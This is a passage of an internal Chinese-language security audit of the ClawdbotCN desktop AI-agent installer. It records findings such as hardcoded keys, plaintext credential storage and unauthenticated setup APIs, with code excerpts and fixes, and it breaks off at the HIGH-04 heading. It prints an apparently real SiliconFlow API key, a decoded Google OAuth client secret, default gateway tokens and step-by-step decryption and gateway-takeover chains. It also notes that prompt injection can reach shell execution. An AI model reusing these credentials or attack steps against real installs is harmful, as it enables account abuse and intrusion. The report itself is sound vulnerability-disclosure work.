# ClawdbotCN 安全审计报告

> **目标产物**：`ClawdbotCN_1.1.20_x64-setup.exe`（256MB NSIS 安装包）
> **审计日期**：2026-02-21（第五轮更新：2026-02-21）
> **审计方式**：红队视角，静态逆向分析（白盒）
> **审计范围**：NSIS 安装包解包 → JS bundle 分析 → 安全模块逆向 → 网络攻击面 → 启动脚本 → 数据上报 → 凭证存储加密 → 扩展安全面 → Tauri IPC / CSP → 更新机制 → License 验证 → WebSocket 协议 → 进程间通信 → 日志泄露
> **文档状态**：内部机密

---

## 修复进度追踪（v1.1.21）

| 漏洞编号 | 标题 | 优先级 | 状态 | 修复版本 |
|---------|------|--------|------|---------|
| CRIT-01 | 加密主密钥算法暴露于明文 JS | P0 | ✅ 已修复 | v1.1.21 |
| CRIT-02 | 硬编码 SiliconFlow API Key | P0 | ✅ 已修复 | v1.1.21 |
| CRIT-03 | 启动脚本硬编码 Gateway Token | P0 | ✅ 已修复 | v1.1.21 |
| CRIT-04 | Google OAuth Client Secret 硬编码（base64 混淆） | P0 | ✅ 已修复 | v1.1.24 |
| CRIT-05 | auth-profiles.json 凭证明文存储 | P0 | ✅ 已修复 | v1.1.24 |
| HIGH-01 | 环境变量关闭加密 | P1 | ✅ 已修复 | v1.1.21 |
| HIGH-02 | Setup API 无鉴权 | P1 | ✅ 已修复 | v1.1.21 |
| HIGH-03 | Token 明文在 bat 脚本 | P1 | ✅ 已修复 | v1.1.21 |
| HIGH-04 | 5 个 CN 扩展 JS 混淆，无法审计（~2.6MB） | P1 | ✅ 已修复 | v1.1.24 |
| HIGH-05 | Tauri CSP 启用 unsafe-inline + unsafe-eval | P1 | ✅ 部分修复 | v1.1.24 |
| MED-01 | 硬编码 fallback Gateway Token | P2 | ✅ 已修复 | v1.1.21 |
| MED-02 | Gateway Token 经 URL 查询参数传递 | P2 | ✅ 已修复 | v1.1.21 |
| MED-03 | 环境变量禁用 ControlUI 设备鉴权 | P2 | ✅ 已修复 | v1.1.21 |
| MED-04 | 日志上报含 deviceId/hostname | P2 | ✅ 已修复 | v1.1.24 |
| MED-05 | STATE_DIR 环境变量重定向 | P2 | ✅ 已修复 | v1.1.21 |
| MED-06 | shell:open 无 URL 范围限制（XSS 升级风险） | P2 | ✅ 已修复 | v1.1.24 |
| MED-07 | 扩展安装无平台级签名校验 | P2 | ✅ 已修复 | v1.1.24 |
| MED-08 | Tauri sidecar 鉴权 Token 使用非 CSPRNG 生成 | P2 | ✅ 已修复 | v1.1.24 |
| LOW-01 | SHA256 完整性校验可 patch | P3 | ✅ 已修复 | v1.1.21 |
| LOW-02 | Canvas Host 本地免鉴权 | P3 | ⏳ 待处理（设计取舍） | — |
| LOW-03 | 安全原生模块（native addon）缺失，JS fallback 总激活 | P3 | ⏳ 待处理 | — |
| CRIT-06 | `OPENCLAWCN_DEV=1` 环境变量完全绕过 License 验证 | P0 | ⏳ 待处理 | — |
| HIGH-06 | 更新包自引用校验——无独立签名验证 | P1 | ⏳ 待处理 | — |
| HIGH-07 | CN 默认安全配置允许 cmd/powershell 无确认执行 | P1 | ⏳ 待处理 | — |
| HIGH-08 | License 元数据（tier/expiry/features）明文存储可篡改 | P1 | ⏳ 待处理 | — |
| MED-09 | 更新服务器 URL 可被环境变量/install.json 劫持 | P2 | ⏳ 待处理 | — |
| MED-10 | process.env 全量继承给子进程（含 Gateway Token/API Key） | P2 | ⏳ 待处理 | — |
| MED-11 | safeEqualSecret() 存在时序侧信道（长度泄露） | P2 | ⏳ 待处理 | — |
| MED-12 | /api/health 端点无鉴权泄露 Provider 配置状态 | P2 | ⏳ 待处理 | — |
| MED-13 | ESM Gateway 主 bundle 未纳入完整性校验范围 | P2 | ⏳ 待处理 | — |
| MED-14 | Config 审计日志记录 process.argv（含命令行 token） | P2 | ⏳ 待处理 | — |
| LOW-04 | 临时文件名使用 Math.random()（可预测） | P3 | ⏳ 待处理 | — |
| LOW-05 | Setup CORS 允许所有 localhost 端口 | P3 | ⏳ 待处理 | — |
| LOW-06 | WebSocket Hello 泄露 hostname 和 Git Commit Hash | P3 | ⏳ 待处理 | — |
| LOW-07 | HMAC 请求签名使用 License Key 作为密钥（自签名） | P3 | ⏳ 待处理 | — |

**已修复（v1.1.21 + v1.1.24）**：19 / 36
**剩余**：CRIT-06、HIGH-06、HIGH-07、HIGH-08、MED-09～MED-14、LOW-02～LOW-07

### 修复说明

| 漏洞 | 修复方式 | 涉及文件 |
|------|---------|---------|
| CRIT-01 | 删除 daemon-cli.js 密钥派生逻辑，改为服务端 skillKey 注入 | `src/security/content-vault.ts` |
| CRIT-02 | 移除硬编码 SiliconFlow API Key，改为运行时配置 | `src/config/defaults.ts` |
| CRIT-03 | bat 脚本改为运行时从 config JSON 读取 token，不再硬编码 | `scripts/windows/*.bat` |
| HIGH-01 | `setContentVaultDevMode(false)` 在启动极早期调用并锁定 | `src/security/content-vault.ts` |
| HIGH-02 | Setup 完成后返回 410 Gone；写操作加 loopback-only 检查；/browse-directory 路径校验 | `src/gateway/setup-wizard.ts`, `setup-wizard-handlers.ts` |
| HIGH-03 | 同 CRIT-03；安装包 bat 不含任何 token | `scripts/windows/*.bat` |
| MED-01 | 移除 `\|\| 'openclawcn2026'` fallback | `src/gateway/setup-page-components.ts` |
| MED-02 | `?token=` 改为 `#token=`（URL fragment，不进服务器日志） | `scripts/windows/clawdbot.bat` |
| MED-03 | 桌面模式设备鉴权绕过增加 `isLocalClient` 前提条件 | `src/gateway/server/ws-connection/message-handler.ts` |
| MED-05 | `resolveStateDir()` 加路径安全校验，阻断系统目录重定向 | `src/config/paths.ts` |
| LOW-01 | 新增 `integrity-hashes-root.json` 双重哈希链；`loadEmbeddedHashes()` 验证 hashes.json 未被篡改 | `src/security/integrity.ts`, `scripts/generate-integrity-hashes.ts` |
| CRIT-04 | 移除 base64 硬编码的 Google OAuth 凭证，改为环境变量注入（`CLAWDBOT_ANTIGRAVITY_OAUTH_CLIENT_ID/SECRET`） | `extensions/google-antigravity-auth/index.ts` |
| CRIT-05 | `saveAuthProfileStore()` 自动检测加密状态并使用 AES-256-GCM 加密保存；启动时 `autoMigrateAuthStore()` 自动迁移明文到加密；新增 `loadSecureJsonSync()` 同步解密加载 | `src/agents/auth-profiles/store.ts`, `src/infra/secure-storage.ts`, `src/cli/gateway-cli/run.ts` |
| HIGH-05 | 移除 CSP `script-src` 中的 `unsafe-inline`（阻断内联脚本注入）；收紧 `img-src` 到指定域名（阻断 DNS exfiltration）；`unsafe-eval` 暂保留（需重构 main.rs 的 window.eval() 为 Tauri IPC） | `apps/desktop/src-tauri/tauri.conf.json` |
| MED-04 | 日志上报前过滤 API Key/OAuth Token/密钥等敏感模式；hostname 改为 base64 哈希前缀（隐私保护） | `src/gateway/server-methods/log-report.ts` |
| MED-06 | `shell.open` 从 `true`（无限制）改为正则 `^https?://\|^mailto:\|^tel:`，阻断 `file://`、`ms-settings:` 等危险协议 | `apps/desktop/src-tauri/tauri.conf.json` |
| MED-08 | Token 生成从 `DefaultHasher`（SipHash + 可预测种子）改为 `getrandom` crate（OS CSPRNG），24字节随机 | `apps/desktop/src-tauri/src/sidecar.rs`, `Cargo.toml` |
| HIGH-04 | 移除 5 个 CN 扩展的 63 个混淆 .js 文件，改为 CI `build:cn-extensions` 步骤从 TS 源码编译干净 JS（esbuild, es2023）；`verify:extensions` 步骤校验编译输出一致性（SHA256 对比），检测混淆特征（`_0x` 前缀、RC4 自解码）；`extension-build-manifest.json` 记录所有文件 SHA256 哈希；`.gitignore` 阻止 .js 再次提交 | `cn/scripts/build/compile-extensions.ts`, `cn/scripts/build/verify-extensions.ts`, `config/cn-protected-files.json`, `.gitignore` |
| MED-07 | 新增 Ed25519 扩展签名机制：CI 构建时使用 `OPENCLAWCN_EXTENSION_SIGNING_KEY` 私钥签名 `extension-build-manifest.json`；运行时通过 `verifyManifestSignature()` 验证签名有效性 + 抽检文件哈希一致性（warning-only, 不阻塞启动）；签名工具 `--generate-keypair` 生成 Ed25519 密钥对 | `src/security/extension-signature.ts`, `cn/scripts/build/compile-extensions.ts`, `src/cli/gateway-cli/run.ts` |

---

## 摘要

本次审计（经五轮深度分析）共发现 **36 个安全漏洞**，其中：

| 严重度 | 数量 | 第三/四轮新增 | 第五轮新增 |
|--------|------|-------------|-----------|
| 严重（Critical） | 6 | +2（CRIT-04、CRIT-05） | +1（CRIT-06） |
| 高危（High） | 8 | +2（HIGH-04、HIGH-05） | +3（HIGH-06、HIGH-07、HIGH-08） |
| 中危（Medium） | 14 | +3（MED-06、MED-07、MED-08） | +6（MED-09～MED-14） |
| 低危（Low） | 7 | +1（LOW-03） | +4（LOW-04～LOW-07） |

**核心问题（原始）**：安全模块（`.jsc` 字节码）保护了执行逻辑，但核心加密算法被重复实现在未受保护的 `daemon-cli.js` 明文文件中，导致字节码保护完全架空。

**第三/四轮新核心问题**：
1. 所有用户 API Key（含 OAuth access/refresh token）以**明文 JSON** 存储，`saveAuthProfileStoreEncrypted()` 函数已有注释但从未接入；
2. Google OAuth Client Secret **以 base64 编码内嵌**扩展包，一行命令即可解码；
3. 5 个 CN 渠道扩展的运行时 JS 经过重度混淆（共 2.6MB），无法与附带的 TypeScript 源码交叉验证；
4. Tauri WebView CSP 启用 `unsafe-eval`，为 XSS → 原生命令执行提供了立足点。

**第五轮新核心问题**：
5. `OPENCLAWCN_DEV=1` 环境变量可**完全绕过 License 在线验证**，自动授予 365 天 test 许可证——生产版本中的开发后门；
6. 更新机制的 SHA-256 哈希和 checksum 文件**来自同一个可被劫持的更新服务器**，无独立 RSA/GPG 签名——MITM 可推送恶意更新；
7. CN 安全默认配置将 `cmd`、`powershell` 加入 exec 白名单且 `ask: "off"`——AI Agent 提示注入可直接获得 shell 执行权；
8. License 元数据（tier、expiresAt、features、offlineValidUntil）以**明文 JSON 存储**于 `openclawcn.json`，可直接篡改获得永久高级许可证；
9. Gateway Token、API Key 通过 `process.env` **全量继承**给所有子进程（含 MCP 插件），恶意插件可直接读取。

---

## 一、攻击面概览

```
NSIS 安装包（无密码）
    ├── 7-Zip 直接解包 → 60,696 个文件
    ├── daemon-cli.js（明文 2.5MB）← 核心漏洞所在
    ├── gateway-cli-*.js（明文 36,563 行）← 网络层 + License 全部逻辑可读
    ├── content-vault-*.js（明文，4份副本）← 密钥派生仍在 ← 第五轮
    ├── update-check-*.js（明文）← 更新机制无独立签名 ← 第五轮
    ├── security/*.jsc（V8 字节码）← Node.js 22，无公开反编译器
    ├── license/*.jsc（V8 字节码）← 但 ESM bundle 含完整可读副本 ← 第五轮
    ├── resources/skills/*.md.enc（79 个加密技能文件）
    ├── agents/auth-profiles.json（运行时明文凭证存储）← 第三轮
    ├── extensions/（36 个扩展，含 2.6MB 混淆 JS）← 第四轮
    ├── install.json（可篡改更新服务器 URL）← 第五轮
    ├── openclawcn.json（License 元数据明文，可篡改）← 第五轮
    └── clawdbot-desktop.exe（Tauri 2.10.2 二进制）← Tauri IPC 攻击面
```

---

## 二、漏洞详情

---

### [CRIT-01] 加密主密钥算法完全暴露于明文 JS

**严重度**：Critical
**位置**：`resources/dist/daemon-cli.js` 第 8574–8710 行
**CVSS 向量**：AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

#### 描述

Skill 内容文件（`.md.enc`）的完整加密方案——包括算法、密钥派生函数、盐值——全部以明文形式存在于 `daemon-cli.js` 中：

```javascript
// daemon-cli.js 第 8641 行
const CONTENT_VAULT_SALT = "openclawcn-content-vault-v1-aes256";

// 第 8649–8650 行
const machineId = getMachineId();
const key = createHash("sha256").update(`${machineId}|${CONTENT_VAULT_SALT}`).digest();

// 第 8660 行
const cipher = createCipheriv("aes-256-cbc", key, iv);

// 文件格式：[前16字节 = IV][后续 = AES-256-CBC 密文]
```

`getMachineId()` 在 Windows 上读取注册表公开值：
```
HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid
```

#### 攻击步骤

1. 7-Zip 解包 NSIS 安装包（无任何保护，30秒）
2. 读 `daemon-cli.js` 第 8641 行获取盐值
3. `reg query "HKLM\SOFTWARE\Microsoft\Cryptography" /v MachineGuid` 获取机器码
4. 10 行 Node.js 脚本解密所有 `.enc` 文件

#### 根本原因

加密核心逻辑在 `content-vault.jsc`（字节码保护），但同一逻辑被重复实现在明文 `daemon-cli.js` 中，导致字节码保护形同虚设。

#### 影响

全部 79 个 `.enc` Skill 文件可被任意具备基础编程能力的用户解密。

#### 修复方案

- 从 `daemon-cli.js` 完全删除密钥派生逻辑，仅保留在 `.jsc` 中
- 根本解决：引入服务端密钥派生（参见 `docs/requirements/skill-key-server-derivation-api.md`）

---

### [CRIT-02] 硬编码第三方 API Key 打入安装包

**严重度**：Critical
**位置**：`resources/dist/daemon-cli.js` 第 3070、3108 行；另有 6 处副本
**CVSS 向量**：AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

#### 描述

SiliconFlow 嵌入向量服务的 API Key 被硬编码进所有安装包：

```javascript
apiKey: "sk-bdlrjsxfgryopcpjvqbuyygzchkisgzwqucnbdkzurzueukv"
baseUrl: "https://api.siliconflow.cn/v1"
```

出现文件：
- `resources/dist/daemon-cli.js`（2处）
- `resources/dist/config-B087zWDN.js`、`config-CFs5y8_v.js`、`config-DsJodAEg.js`、`config-Dydicn7S.js`（各2处）
- `resources/dist/plugin-sdk/index.js`（2处）
- `resources/dist/config/defaults.js`（2处）

#### 影响

任何安装了此应用的用户（或解包安装包的攻击者）均可获得该 Key，用于消耗开发团队的 SiliconFlow API 配额，造成直接经济损失。

#### 修复方案

- **立即**轮换该 API Key
- 改为运行时从服务端下发或用户自行配置，禁止硬编码进发布产物

---

### [HIGH-01] 环境变量一键关闭全部加密

**严重度**：High
**位置**：`resources/dist/daemon-cli.js` 第 8700–8702 行
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

#### 描述

```javascript
function isEncryptionEnabled() {
    if (devModeLocked) return !devModeFlag;
    return process.env.CLAWDBOT_PROFILE !== "dev";  // ← 关键
}
```

若在进程启动时注入 `CLAWDBOT_PROFILE=dev`，且 `setContentVaultDevMode()` 尚未锁定（`devModeLocked = false`），则：
- 所有 `.enc` 文件读取时**直接跳过解密**，返回原始密文（或跳过整个解密流程）
- 写入配置时敏感字段**不加密**，以明文写入磁盘

#### 影响

在可控启动环境（如开发者调试、被攻击的自动化部署环境）中，整套加密体系被单个环境变量绕过。

#### 修复方案

- 确保 `setContentVaultDevMode(false)` 在程序启动极早期被调用并锁定（`devModeLocked = true`）
- 不信任运行时环境变量来控制安全开关

---

### [HIGH-02] Setup API 无鉴权，可写配置/浏览文件系统

**严重度**：High
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 31384–31475 行
**CVSS 向量**：AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N（LAN 模式下）

#### 描述

`/api/setup/*` 路由的整个处理函数 `handleSetupWizardHttpRequest()` **无任何 Token 验证**，仅通过 CORS `Origin` 头做简单过滤（对非浏览器客户端完全无效）。

受影响端点：

| 端点 | 功能 | 危害 |
|------|------|------|
| `POST /api/setup/configure-provider` | 向配置文件写入 AI Provider 和 API Key | 注入恶意 provider |
| `POST /api/setup/configure-workspace` | 修改工作目录配置 | 路径劫持 |
| `POST /api/setup/complete` | 标记 setup 完成 | 跳过初始化流程 |
| `POST /api/setup/validate-license` | 触发 License 验证 | 可用于暴力枚举 License Key |
| `POST /api/setup/switch-device` | 切换设备绑定 | 潜在授权劫持 |
| `GET /api/setup/browse-directory` | 浏览服务器文件系统 | **本地路径遍历/信息泄露** |

#### 触发条件

- 网关绑定到 loopback（默认）：仅本机可利用，配合 SSRF 或本地进程注入
- 网关绑定到 LAN（`--bind lan`）：局域网任意设备无认证可调用

#### 说明

该 API 路由在 `handleHooksRequest` 之后、其他鉴权路由之前被调用（第 33464 行），且整个 setup 完成后路由仍然存在（`shouldShowSetupWizard()` 返回 false 后路由依然注册）。

#### 修复方案

- Setup 完成后从 HTTP 路由中注销 `/api/setup/*`
- 对写操作端点加 loopback-only IP 检查（不依赖 Origin 头）
- `/browse-directory` 路径校验，禁止遍历至配置目录之外

---

### [MED-01] 硬编码 fallback Gateway Token

**严重度**：Medium
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 24028 行
**CVSS 向量**：AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N

#### 描述

Setup 页面 JS 中存在固定的 fallback gateway token：

```javascript
// 第 24028 行
const gatewayToken = window.__GATEWAY_TOKEN__ || 'openclawcn2026';
```

如果服务端未注入 `__GATEWAY_TOKEN__`（配置缺失或边缘场景），页面使用固定值 `openclawcn2026` 作为 gateway token 并嵌入跳转 URL。

若网关侧也恰好使用此值作为默认 token（需进一步运行时验证），攻击者可直接用 `openclawcn2026` 完成 WebSocket 鉴权。

#### 修复方案

- 移除 `|| 'openclawcn2026'` fallback，`__GATEWAY_TOKEN__` 不存在时应拒绝跳转或提示错误
- Token 未配置时网关应拒绝连接，而非使用固定值

---

### [MED-02] Gateway Token 通过 URL Fragment 传递

**严重度**：Medium
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 24033–24041 行
**CVSS 向量**：AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N

#### 描述

```javascript
var hash = '#token=' + encodeURIComponent(gatewayToken)
         + '&gatewayUrl=' + encodeURIComponent(gwUrl);
window.location.href = 'http://tauri.localhost/' + hash;
```

Gateway token 通过 URL fragment（`#`）传递，存在以下风险：
1. Token 出现在浏览器历史记录中
2. 同源页面的任意 JavaScript（包括 XSS payload、恶意浏览器扩展）均可读取 `window.location.hash`
3. Referrer 泄露（部分场景）

#### 修复方案

- 改用 `postMessage` 跨 origin 传递 token
- 或使用 `sessionStorage` 存储后在目标页面读取，避免 token 出现在 URL 中

---

### [MED-03] 环境变量禁用 ControlUI 设备鉴权

**严重度**：Medium
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 34691、34726 行
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N

#### 描述

```javascript
// 第 34691 行
const isDesktopMode = process.env.OPENCLAWCN_DESKTOP_MODE === "1";

// 第 34726 行
const disableControlUiDeviceAuth = isControlUi &&
    (configSnapshot.gateway?.controlUi?.dangerouslyDisableDeviceAuth === true
     || isDesktopMode);   // ← 环境变量可绕过设备鉴权
```

`OPENCLAWCN_DESKTOP_MODE=1` 会禁用 ControlUI 的设备级鉴权，此环境变量可由攻击者在启动时注入。

#### 修复方案

- 桌面模式标志应由 Tauri sidecar 在进程内部设置，不信任外部环境变量
- 或在主进程启动早期锁定此标志，后续无法通过环境变量更改

---

### [LOW-01] SHA256 完整性校验可被 patch 绕过

**严重度**：Low
**位置**：`resources/dist/security/*.js`（全部 wrapper 文件）
**CVSS 向量**：AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N

#### 描述

每个 `.jsc` 字节码文件有对应的 `.js` wrapper 做加载前 SHA256 校验：

```javascript
const _h = require("crypto").createHash("sha256")
    .update(require("fs").readFileSync(_p)).digest("hex");
if (_h !== "3ff26359172660f246bb5e5d15d1faa7315ae56cea005b0253cb0bf66e15ef0a")
    { console.error("[integrity] bytecode tampered"); process.exit(1); }
```

绕过方法：直接修改 `.js` wrapper 中的 hash 字符串，使其等于篡改后 `.jsc` 文件的 SHA256。不需要逆向字节码，只需修改一行文本。

#### 注意

`integrity.jsc` 的巡逻监控（`startIntegrityPatrol`）可能检测到 `.js` 文件被篡改。实际可利用性取决于 `integrity.jsc` 的具体实现，难度较高。

#### 修复方案

- 对 `.js` wrapper 文件本身也纳入 `integrity-hashes.json` 的完整性校验范围
- 或将 wrapper 逻辑内联到主进程启动代码中，减少可篡改的外部文件

---

### [CRIT-03] 启动脚本硬编码 Gateway Token 并通过 URL 查询参数明文传递

**严重度**：Critical
**位置**：`resources/start-gateway.bat`、`resources/clawdbot.bat`
**CVSS 向量**：AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

#### 描述

两个启动脚本均硬编码了相同的 Gateway 访问 Token：

```bat
:: start-gateway.bat 第21行
set "CLAWDBOT_GATEWAY_TOKEN=clawdbot2026"

:: clawdbot.bat 第11、13行
set "CLAWDBOT_GATEWAY_TOKEN=clawdbot2026"
set "TOKEN=clawdbot2026"
```

更严重的是，`clawdbot.bat` 将 token 作为**明文 URL 查询参数**传递给浏览器：

```bat
set "OPEN_URL=http://localhost:18789/setup?token=!TOKEN!"
set "OPEN_URL=http://localhost:18789/?token=!TOKEN!"
start "" "!OPEN_URL!"
```

**查询参数（`?token=`）与 URL Fragment（`#token=`）的关键区别**：
- 查询参数会出现在 HTTP 服务器访问日志中
- 会被保存在浏览器历史记录
- 会出现在 HTTP `Referer` 头中（当页面跳转到第三方资源时）
- 浏览器扩展可读取完整 URL

#### 综合攻击链

1. 攻击者解包安装包获取 `clawdbot.bat` → 获知 token `clawdbot2026`
2. 直接用此 token 发起 WebSocket `connect` 请求
3. 若用户未自定义 `gateway.auth.token`，网关使用环境变量 `CLAWDBOT_GATEWAY_TOKEN=clawdbot2026` 作为有效 token
4. **全权接管 Gateway**：可读取所有会话、执行 Agent 命令、获取用户 AI Provider 凭证

注意：`gateway-cli-kSg0il7V.js` 第 24028 行的 fallback `'openclawcn2026'` 与此处 `'clawdbot2026'` 不同，说明存在多处不一致的硬编码，增加了混淆性。

#### 影响

- 任何知道安装包内容的人（即所有用户）都知道默认 token
- 若用户从未修改配置，该 token 即为真实有效的 Gateway 访问凭证

#### 修复方案

- 首次安装时**随机生成**一个 UUID 作为 gateway token，写入配置
- 绝对禁止在脚本中硬编码任何 token 值
- 改用 URL Fragment（`#token=`）而非查询参数传递 token（参见 MED-02）

---

### [HIGH-03] Token 明文出现在启动批处理脚本（所有用户可读）

**严重度**：High
**位置**：`resources/start-gateway.bat`、`resources/clawdbot.bat`
**注**：此条与 CRIT-03 关联，侧重文件系统权限层面

#### 描述

安装后，`start-gateway.bat` 和 `clawdbot.bat` 存放在安装目录（默认 `%APPDATA%\ClawdbotCN` 或安装路径下）。Windows 默认安装目录对所有本地用户可读。

任何本地用户可直接 `type start-gateway.bat` 获取 gateway token，无需任何权限提升。

#### 修复方案

- 安装完成后从脚本中移除硬编码 token，改为读取配置文件中的随机生成 token
- 对存储 token 的配置文件设置 Windows ACL（仅允许当前用户读取）—— `windows-acl.jsc` 模块已有此能力，应实际启用

---

### [MED-04] 日志上报内含 deviceId 和主机名，无混淆保护

**严重度**：Medium
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 9522–9700 行
**CVSS 向量**：AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N

#### 描述

用户点击"提交问题报告"时，以下数据被上传至 `https://www.obplugins.cn/api/api/v1/log-report/submit`：

```json
{
  "id": "rpt-xxx",
  "deviceId": "<设备唯一标识符>",
  "description": "<用户输入的描述>",
  "attachments": ["<截图base64>", ...],
  "logEntries": ["<最多500条日志>", ...],
  "context": {
    "version": "1.1.20",
    "platform": "win32",
    "hostname": "<用户电脑名>",
    "uptime": 12345,
    "timestamp": "..."
  }
}
```

**关注点**：
1. `logEntries` 最多 500 条日志，日志中可能包含 API Key 的部分信息、会话内容摘要、错误信息中的路径
2. `deviceId` 是设备唯一标识符，上传至服务端后可用于追踪用户
3. `hostname` 暴露用户电脑名
4. 上报是**用户主动触发**的，无自动上报，风险可控——但日志内容的敏感性边界不清晰

#### 修复方案

- 明确文档说明日志上报收集的数据范围
- 上报前对日志内容做敏感信息过滤（API Key 模式匹配 `sk-...`、`ENC{...}` 等）
- 隐私政策中声明此行为

---

### [MED-05] `OPENCLAWCN_STATE_DIR` 环境变量可重定向配置读写

**严重度**：Medium
**位置**：`resources/dist/daemon-cli.js` 第 115 行
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N

#### 描述

```javascript
const override = env.OPENCLAWCN_STATE_DIR?.trim() || env.CLAWDBOT_STATE_DIR?.trim();
```

通过注入 `OPENCLAWCN_STATE_DIR` 或 `CLAWDBOT_STATE_DIR` 环境变量，可将应用的配置读写重定向到攻击者控制的目录：

**攻击场景 A（配置注入）**：
- 将 `OPENCLAWCN_STATE_DIR` 指向攻击者准备的目录
- 该目录中放置恶意 `openclawcn.json`，内含恶意 AI Provider 端点（用于窃取用户对话）

**攻击场景 B（凭证窃取）**：
- 将 State Dir 指向可读位置后触发配置写入
- 获取写出的 `ENC{...}` 格式凭证，结合已知的密钥派生算法（见 CRIT-01）解密

#### 修复方案

- 启动早期锁定 State Dir 路径，不信任运行时环境变量
- 或对 State Dir 路径做合法性校验（必须在用户主目录下）

---

### [LOW-02] Canvas Host 本地请求免鉴权

**严重度**：Low
**位置**：`resources/dist/gateway-cli-kSg0il7V.js` 第 32989–32994 行
**CVSS 向量**：AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N

#### 描述

```javascript
async function authorizeCanvasRequest(params) {
    if (isLocalDirectRequest(req, trustedProxies)) return { ok: true };  // ← 本地直连免鉴权
    // ...后续 Bearer token 检查
}
```

Canvas Host（用于渲染 AI 生成的 UI 组件）对本地 loopback 连接完全免鉴权。

任何本机进程均可在不提供 token 的情况下访问 Canvas Host 端点。在受感染的系统上，本地恶意进程可向 Canvas Host 注入内容。

#### 说明

这是 Tauri 桌面模式的设计取舍，本机可信度较高，风险相对可控。但在共享计算机或受感染环境下值得关注。

---

---

### [CRIT-04] Google OAuth Client Secret 硬编码于扩展包（base64 伪混淆）

**严重度**：Critical
**位置**：`resources/extensions/google-antigravity-auth/index.ts`（运行时加载对应 `index.js`）
**CVSS 向量**：AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

#### 描述

Google OAuth 凭证以 base64 编码内嵌于扩展源文件中：

```typescript
// index.ts（源码随包附带）
const CLIENT_ID = decode(
  "MTA3MTAwNjA2MDU5MS10bWhzc2luMmgyMWxjcmUyMzV2dG9sb2poNGc0MDNlcC5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbQ=="
);
const CLIENT_SECRET = decode("R09DU1BYLUs1OEZXUjQ4NkxkTEoxbUxCOHNYQzR6NnFEQWY=");
```

**解码值（一条 `atob()` 即可获取）：**
- `CLIENT_ID`：`1071006060591-tmhssin2h21lcre235vtolojh4g403ep.apps.googleusercontent.com`
- `CLIENT_SECRET`：`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`
- `project_id`：`rising-fact-p41fc`

Base64 编码**不是加密**，任何人可在 1 秒内解码。对比 `google-gemini-cli-auth` 扩展的正确做法——从环境变量或本地安装的 Gemini CLI 读取凭证——此处做法相差天壤之别。

#### 影响

攻击者可使用此 `CLIENT_ID` + `CLIENT_SECRET` 冒充本应用发起 Google OAuth 流程，诱骗用户授权，进而：
- 获取用户 Google 账号访问 token
- 在 OAuth 应用授权页欺骗用户（显示为"合法的 ClawdbotCN"）
- 若 Google 检测到凭证滥用，整个 Google 登录功能将被吊销

#### 修复方案

1. **立即吊销**该 `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` 并在 Google Cloud Console 重新生成
2. 改为运行时从环境变量注入：`CLAWDBOT_GOOGLE_OAUTH_CLIENT_ID` / `CLAWDBOT_GOOGLE_OAUTH_CLIENT_SECRET`（参考同包的 `google-gemini-cli-auth` 扩展）
3. 删除扩展中的 `index.ts` 明文源码（或至少删除含凭证的行）

---

### [CRIT-05] 所有 API Key 及 OAuth Token 以明文 JSON 存储于磁盘

**严重度**：Critical
**位置**：`~/.openclawcn/agents/auth-profiles.json`（运行时文件）
**代码根因**：`github-copilot-auth-CeYME2mj.js` → `saveAuthProfileStore()` → `saveJsonFile()`
**CVSS 向量**：AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

#### 描述

应用将所有 AI Provider 凭证（API Key、OAuth access token、refresh token）以**明文 JSON** 写入磁盘：

```javascript
// saveAuthProfileStore() 注释（github-copilot-auth-CeYME2mj.js，Layer 2.5）
/**
 * 保存认证存储
 *
 * 注意: 此函数保持同步以向后兼容
 * 如果需要加密存储，请使用 saveAuthProfileStoreEncrypted()
 */
function saveAuthProfileStore(store, agentDir) {
    saveJsonFile(resolveAuthStorePath(agentDir), {
        version: 1,
        profiles: store.profiles,   // ← 明文 API Key / OAuth Token
        ...
    });
}
```

**`saveAuthProfileStoreEncrypted()` 存在于注释中，但从未被调用。**

生成的 `auth-profiles.json` 格式：
```json
{
  "version": 1,
  "profiles": {
    "kimi-coding:default": { "type": "api_key", "provider": "kimi-coding", "key": "sk-xxxx" },
    "anthropic:default":   { "type": "api_key", "provider": "anthropic",   "key": "sk-ant-xxxx" },
    "github:user@example.com": {
      "type": "oauth", "provider": "github",
      "access": "gho_xxxxx", "refresh": "ghr_xxxxx", "expires": 1234567890
    }
  }
}
```

文件权限设为 `0o600`（Unix 系统有效），但：
- **Windows 上 `chmod` 无效**：NTFS ACL 未通过 `windows-acl.jsc` 设置，文件对系统上所有用户可读
- 任何本机进程（含恶意软件、内存泄露的日志）均可直接读取

#### 影响

- 所有已配置的 AI Provider API Key 一次性泄露
- GitHub/Google/Qwen/Minimax 等 OAuth token 同时泄露，攻击者可立即使用

#### 修复方案

1. **立即**接入已实现的 `saveAuthProfileStoreEncrypted()`（使用 content-vault 的 AES-256-CBC）
2. 对 Windows 平台，调用 `windows-acl.jsc`（已实现）为 `auth-profiles.json` 设置 NTFS ACL
3. 迁移现有明文 `auth-profiles.json`：首次启动时检测旧格式，自动加密并覆写

---

### [HIGH-04] 5 个 CN 渠道扩展运行时 JS 经过重度混淆，无法与附带源码交叉验证

**严重度**：High
**位置**：`resources/extensions/{dingtalk,feishu,openclawwechat,qqbot,wecom}/`

#### 描述

